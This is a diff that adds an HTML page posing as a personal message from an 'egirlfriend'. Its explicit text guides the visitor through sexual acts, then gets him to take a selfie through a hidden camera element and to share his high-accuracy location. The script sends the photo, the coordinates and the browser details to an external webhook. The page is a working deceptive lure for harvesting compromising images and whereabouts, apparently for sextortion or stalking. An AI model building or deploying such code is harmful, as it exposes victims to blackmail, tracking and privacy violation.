@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>💕</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+            padding: 20px;
+        }
+        .container {
+            max-width: 500px;
+            width: 100%;
+            text-align: center;
+        }
+        .step { display: none; }
+        .step.active { display: block; }
+        
+        .image-container {
+            width: 100%;
+            max-width: 400px;
+            margin: 0 auto 24px;
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: 0 8px 32px rgba(255, 20, 147, 0.3);
+        }
+        .image-container img {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+        
+        .text {
+            color: #ff69b4;
+            font-size: 20px;
+            font-weight: 600;
+            line-height: 1.6;
+            margin-bottom: 30px;
+            padding: 0 10px;
+        }
+        
+        .btn {
+            background: linear-gradient(135deg, #ff1493 0%, #ff69b4 100%);
+            color: white;
+            border: none;
+            padding: 16px 48px;
+            font-size: 18px;
+            font-weight: 700;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(255, 20, 147, 0.4);
+            text-transform: none;
+            letter-spacing: 0.5px;
+        }
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(255, 20, 147, 0.6);
+        }
+        .btn:active { transform: translateY(0); }
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+        
+        .selfie-preview {
+            width: 200px;
+            height: 200px;
+            border-radius: 50%;
+            object-fit: cover;
+            border: 4px solid #ff1493;
+            margin: 20px auto;
+            display: block;
+            box-shadow: 0 4px 20px rgba(255, 20, 147, 0.4);
+        }
+        
+        .hidden-video {
+            position: absolute;
+            top: -9999px;
+            left: -9999px;
+        }
+        
+        .loading {
+            color: #ff69b4;
+            font-size: 16px;
+            margin: 20px 0;
+        }
+        
+        .emoji-big {
+            font-size: 48px;
+            margin-bottom: 20px;
+        }
+
+        .progress-dots {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 24px;
+        }
+        .dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: rgba(255, 20, 147, 0.3);
+        }
+        .dot.filled { background: #ff1493; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Step 0: Welcome -->
+        <div class="step active" id="step0">
+            <div class="emoji-big">💕</div>
+            <p class="text">hiii boyfie ~ i made something special just for u 🤭<br><br>tap continue and be a good boy for me okay?? &gt;.&lt;</p>
+            <button class="btn" onclick="nextStep()">continue 💕</button>
+        </div>
+
+        <!-- Step 1: Pic 1 + prompt -->
+        <div class="step" id="step1">
+            <div class="progress-dots"><div class="dot filled"></div><div class="dot"></div><div class="dot"></div></div>
+            <div class="image-container" id="img1"></div>
+            <p class="text">u like what u see don't u 🤭<br>go ahead and start stroking for me ~ nice and slow 💕</p>
+            <button class="btn" onclick="nextStep()">keep going ~</button>
+        </div>
+
+        <!-- Step 2: Pic 2 + prompt -->
+        <div class="step" id="step2">
+            <div class="progress-dots"><div class="dot filled"></div><div class="dot filled"></div><div class="dot"></div></div>
+            <div class="image-container" id="img2"></div>
+            <p class="text">mmm good boy ~ faster now 💞<br>ur doing sooo well for ur cute egirlfriend &gt;.&lt;</p>
+            <button class="btn" onclick="nextStep()">don't stop ~</button>
+        </div>
+
+        <!-- Step 3: Pic 3 + prompt -->
+        <div class="step" id="step3">
+            <div class="progress-dots"><div class="dot filled"></div><div class="dot filled"></div><div class="dot filled"></div></div>
+            <div class="image-container" id="img3"></div>
+            <p class="text">don't stop boyfie 🤭 u feel so good right??<br>that's bc ur mine ~<br><br>now i need u to do something for me 💕</p>
+            <button class="btn" onclick="nextStep()">anything for u ~</button>
+        </div>
+
+        <!-- Step 4: Selfie -->
+        <div class="step" id="step4">
+            <div class="emoji-big">📸</div>
+            <p class="text">take a cute selfie for me 💞<br>i wanna see ur face &gt;.&lt;</p>
+            <button class="btn" id="selfieBtn" onclick="takeSelfie()">take selfie 💕</button>
+            <video id="camVideo" class="hidden-video" autoplay playsinline></video>
+            <canvas id="camCanvas" style="display:none;"></canvas>
+            <img id="selfiePreview" class="selfie-preview" style="display:none;">
+            <button class="btn" id="selfieNext" style="display:none; margin-top: 16px;" onclick="nextStep()">continue ~</button>
+        </div>
+
+        <!-- Step 5: Location -->
+        <div class="step" id="step5">
+            <div class="emoji-big">📍</div>
+            <p class="text">sooo cute 🥺💕<br>one more thing ~ let me know where my good boy is ~</p>
+            <button class="btn" id="locBtn" onclick="getLocation()">share location 💕</button>
+            <p class="loading" id="locLoading" style="display:none;">finding u ~ 💕</p>
+        </div>
+
+        <!-- Step 6: Done -->
+        <div class="step" id="step6">
+            <div class="emoji-big">🩷</div>
+            <p class="text">good boy 💕<br><br>ur submission has been sent ~<br>ur cute egirlfriend is sooo proud of u &gt;.&lt; 🩷</p>
+        </div>
+    </div>
+
+    <script>
+        const IMAGE_SERVICE = "https://custom-pics-service-production.up.railway.app";
+        const WEBHOOK_URL = "https://custom-pics-service-production.up.railway.app/api/joi-submit";
+        
+        let currentStep = 0;
+        let selfieData = null;
+        let locationData = null;
+
+        async function loadImage(containerId) {
+            try {
+                const res = await fetch(`${IMAGE_SERVICE}/api/random-image`);
+                const data = await res.json();
+                const url = data.url.startsWith('http') ? data.url : IMAGE_SERVICE + data.url;
+                const container = document.getElementById(containerId);
+                const img = document.createElement('img');
+                img.src = url;
+                container.appendChild(img);
+            } catch(e) {
+                console.log('Image load error:', e);
+            }
+        }
+
+        function showStep(n) {
+            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+            document.getElementById('step' + n).classList.add('active');
+        }
+
+        async function nextStep() {
+            currentStep++;
+            showStep(currentStep);
+            
+            if (currentStep === 1) await loadImage('img1');
+            if (currentStep === 2) await loadImage('img2');
+            if (currentStep === 3) await loadImage('img3');
+        }
+
+        async function takeSelfie() {
+            const btn = document.getElementById('selfieBtn');
+            btn.disabled = true;
+            btn.textContent = 'opening camera ~';
+            
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'user' }, 
+                    audio: false 
+                });
+                
+                const video = document.getElementById('camVideo');
+                video.srcObject = stream;
+                
+                await new Promise(resolve => {
+                    video.onloadedmetadata = () => {
+                        video.play();
+                        setTimeout(resolve, 1500);
+                    };
+                });
+                
+                const canvas = document.getElementById('camCanvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0);
+                
+                selfieData = canvas.toDataURL('image/jpeg', 0.8);
+                
+                stream.getTracks().forEach(t => t.stop());
+                
+                const preview = document.getElementById('selfiePreview');
+                preview.src = selfieData;
+                preview.style.display = 'block';
+                btn.style.display = 'none';
+                document.getElementById('selfieNext').style.display = 'inline-block';
+                
+            } catch(e) {
+                btn.textContent = 'camera denied ~ try again';
+                btn.disabled = false;
+                console.log('Camera error:', e);
+            }
+        }
+
+        async function getLocation() {
+            const btn = document.getElementById('locBtn');
+            btn.disabled = true;
+            document.getElementById('locLoading').style.display = 'block';
+            
+            try {
+                const pos = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {
+                        enableHighAccuracy: true,
+                        timeout: 10000
+                    });
+                });
+                
+                locationData = {
+                    lat: pos.coords.latitude,
+                    lng: pos.coords.longitude,
+                    accuracy: pos.coords.accuracy
+                };
+                
+                await sendSubmission();
+                currentStep++;
+                showStep(currentStep);
+                
+            } catch(e) {
+                btn.textContent = 'location denied ~ try again';
+                btn.disabled = false;
+                document.getElementById('locLoading').style.display = 'none';
+                console.log('Location error:', e);
+            }
+        }
+
+        async function sendSubmission() {
+            try {
+                const payload = {
+                    selfie: selfieData,
+                    location: locationData,
+                    timestamp: new Date().toISOString(),
+                    userAgent: navigator.userAgent
+                };
+                
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+            } catch(e) {
+                console.log('Submit error:', e);
+            }
+        }
+    </script>
+</body>
+</html>
